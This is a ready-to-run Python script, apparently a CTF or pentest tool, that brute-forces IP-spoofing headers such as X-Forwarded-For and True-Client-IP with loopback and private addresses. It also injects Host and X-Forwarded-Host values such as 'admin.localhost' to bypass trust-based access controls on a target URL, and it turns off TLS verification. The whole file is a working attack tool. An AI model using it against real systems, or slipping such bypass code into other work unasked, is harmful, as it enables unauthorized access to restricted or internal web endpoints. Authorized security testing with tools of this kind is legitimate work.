#!/usr/bin/env python3
"""
HTTP header injector.
Sends requests with spoofed or injected headers to test IP-bypass,
Host header injection, and other trust-based access control weaknesses.
Requires: requests
"""

import argparse
import sys

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed: pip install requests", file=sys.stderr)
    sys.exit(1)

# ── Built-in header sets ──────────────────────────────────────────────────────

IP_SPOOF_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "X-Host",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Forwarded",
    "X-Cluster-Client-IP",
]

IP_BYPASS_VALUES = [
    "127.0.0.1",
    "localhost",
    "::1",
    "0.0.0.0",
    "10.0.0.1",
    "192.168.0.1",
    "172.16.0.1",
]

HOST_INJECTION_VALUES = [
    "localhost",
    "127.0.0.1",
    "internal",
    "admin.localhost",
    "internal.target.com",
]


def make_session(base_headers: list[str]) -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (CTF-HeaderInject)"
    for h in base_headers:
        k, _, v = h.partition(":")
        s.headers[k.strip()] = v.strip()
    return s


def send(session, url, method, data, extra_headers, timeout) -> requests.Response | None:
    try:
        if method == "GET":
            return session.get(url, headers=extra_headers, timeout=timeout,
                               verify=False, allow_redirects=True)
        else:
            return session.post(url, data=data, headers=extra_headers,
                                timeout=timeout, verify=False, allow_redirects=True)
    except Exception:
        return None


def print_result(label: str, resp: requests.Response | None,
                 baseline_status: int, baseline_size: int) -> bool:
    if resp is None:
        return False
    diff = len(resp.content) - baseline_size
    changed = (resp.status_code != baseline_status or abs(diff) > 50)
    marker = "[+]" if changed else "[-]"
    print(f"  {marker} {label:<55} {resp.status_code}  {len(resp.content)}B  ({diff:+}B)")
    return changed


def mode_ip_spoof(session, url, method, data, timeout, ip_values):
    print(f"\n[*] IP spoofing headers (testing {len(IP_SPOOF_HEADERS)} headers x {len(ip_values)} IPs)\n")
    baseline = send(session, url, method, data, {}, timeout)
    base_status = baseline.status_code if baseline else 200
    base_size   = len(baseline.content) if baseline else 0
    print(f"    Baseline: {base_status}  {base_size}B\n")

    hits = []
    for hdr in IP_SPOOF_HEADERS:
        for ip in ip_values:
            label = f"{hdr}: {ip}"
            r = send(session, url, method, data, {hdr: ip}, timeout)
            if print_result(label, r, base_status, base_size):
                hits.append({"header": hdr, "value": ip,
                             "status": r.status_code, "size": len(r.content)})
    return hits


def mode_host_injection(session, url, method, data, timeout, host_values):
    print(f"\n[*] Host header injection\n")
    baseline = send(session, url, method, data, {}, timeout)
    base_status = baseline.status_code if baseline else 200
    base_size   = len(baseline.content) if baseline else 0
    print(f"    Baseline: {base_status}  {base_size}B\n")

    hits = []
    for host in host_values:
        for hdr in ("Host", "X-Forwarded-Host", "X-Host"):
            label = f"{hdr}: {host}"
            r = send(session, url, method, data, {hdr: host}, timeout)
            if print_result(label, r, base_status, base_size):
                hits.append({"header": hdr, "value": host})
    return hits


def mode_custom(session, url, method, data, timeout, custom_headers: list[str]):
    print(f"\n[*] Custom header injection\n")
    baseline = send(session, url, method, data, {}, timeout)
    base_status = baseline.status_code if baseline else 200
    base_size   = len(baseline.content) if baseline else 0

    extra = {}
    for h in custom_headers:
        k, _, v = h.partition(":")
        extra[k.strip()] = v.strip()

    r = send(session, url, method, data, extra, timeout)
    print_result(str(extra), r, base_status, base_size)
    if r:
        print(f"\n    Response body (first 500):\n{r.text[:500]}")


def main():
    parser = argparse.ArgumentParser(description="HTTP header injector for IP bypass and Host injection")
    parser.add_argument("--url",    required=True, help="Target URL")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data",   default="", help="POST body (key=val&...)")
    parser.add_argument("--mode",   choices=["ip", "host", "custom", "all"],
                        default="all", help="Test mode (default: all)")
    parser.add_argument("--header", action="append", default=[], dest="custom_headers",
                        metavar="Name: Value",
                        help="Custom header(s) to inject (for --mode custom, repeatable)")
    parser.add_argument("--ip",     default="127.0.0.1",
                        help="IP value(s) for IP spoof test (comma-separated, default: 127.0.0.1)")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--headers", action="append", default=[], metavar="H:V",
                        help="Base headers to include in every request")
    args = parser.parse_args()

    session  = make_session(args.headers)
    data     = {k: v for k, _, v in (p.partition("=") for p in args.data.split("&") if args.data)}
    ip_vals  = [i.strip() for i in args.ip.split(",")]

    print(f"[*] Target: {args.url}  Method: {args.method}")

    all_hits = []
    if args.mode in ("ip", "all"):
        all_hits += mode_ip_spoof(session, args.url, args.method, data,
                                  args.timeout, ip_vals)
    if args.mode in ("host", "all"):
        all_hits += mode_host_injection(session, args.url, args.method, data,
                                        args.timeout, HOST_INJECTION_VALUES)
    if args.mode in ("custom", "all") and args.custom_headers:
        mode_custom(session, args.url, args.method, data,
                    args.timeout, args.custom_headers)

    if all_hits:
        print(f"\n[+] {len(all_hits)} interesting response(s):")
        for h in all_hits:
            print(f"    {h}")
    else:
        print("\n[-] No access control bypass detected via header injection")


if __name__ == "__main__":
    main()
